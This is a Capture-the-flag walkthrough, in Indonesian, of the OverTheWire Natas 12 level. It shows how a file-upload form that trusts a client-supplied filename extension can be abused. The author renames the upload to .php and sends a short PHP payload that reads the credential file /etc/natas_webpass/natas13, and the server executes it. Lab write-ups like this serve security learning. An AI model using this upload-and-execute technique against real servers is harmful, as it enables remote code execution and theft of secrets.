
---

### `natas-12/README.md`

```markdown
# Natas 12 → Natas 13

## 🎯 Objective

Mendapatkan password untuk level Natas 13.

## 🔎 Initial Analysis

Level ini menyediakan fitur upload file dan meminta pengguna mengupload file JPEG dengan ukuran maksimal 1 KB.

Saya kemudian memeriksa source code untuk mengetahui bagaimana nama dan isi file diproses.

## 🧠 Vulnerability / Concept

**Concept:** Unrestricted / Insufficiently Validated File Upload

Masalah utama adalah server mengambil ekstensi dari nilai `filename` yang dikontrol oleh client.

## 🔬 Source / Page Analysis

Potongan kode:

```php
$ext = pathinfo($fn, PATHINFO_EXTENSION);
```
dan:
```php
$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
```

## Analisis

Saya menemukan bahwa:
filename
    ↓
pathinfo()
    ↓
extension
    ↓
target filename

Sementara isi file berasal dari:
uploadedfile

Server hanya memeriksa:
filesize(...)

dan tidak memvalidasi apakah isi file benar-benar JPEG.

## 🧪 Investigation

#### Percobaan 1 — File biasa
filename:
Screenshot 2026-04-09 141135.png

uploadedfile:
The file upload/vftkn0mzir.jpg has been uploaded

Hasil:
http://natas12.natas.labs.overthewire.org/upload/vftkn0mzir.jpg

#### Percobaan 2 — Manipulasi filename

Saya mengubah:
value="tv0rsqb21w.jpg"

menjadi:
value="tv0rsqb21w.php"

Kemudian mengupload file PHP kecil.

```php
<?php 
    echo file_get_contents("/etc/natas_webpass/natas13"); 
?>
```

Hasil :
The file upload/1u1vkls8of.php has been uploaded

Server memberikan:
upload/1u1vkls8of.php

Ketika URL tersebut dibuka, PHP berhasil dieksekusi.